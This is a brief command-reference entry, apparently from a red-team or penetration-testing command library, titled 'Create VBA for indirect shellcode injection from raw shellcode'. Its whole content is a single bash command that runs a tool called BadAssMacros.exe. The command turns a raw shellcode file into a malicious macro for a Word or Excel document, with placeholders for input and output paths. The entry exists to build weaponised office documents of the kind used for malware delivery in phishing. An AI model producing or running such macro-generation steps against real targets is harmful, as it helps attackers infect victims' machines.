---
id: 32eec6bf-d671-4bde-8a27-f994d992c2dc
name: Create VBA for indirect shellcode injection from raw shellcode
type: command
executor: bash
data: BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect
  -o <path_to_output_file>
output: null
created_at: '2023-04-06T03:56:23.622915+00:00'
updated_at: '2023-04-10T20:36:57.674203+00:00'
---

# Create VBA for indirect shellcode injection from raw shellcode

```bash
BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>
```


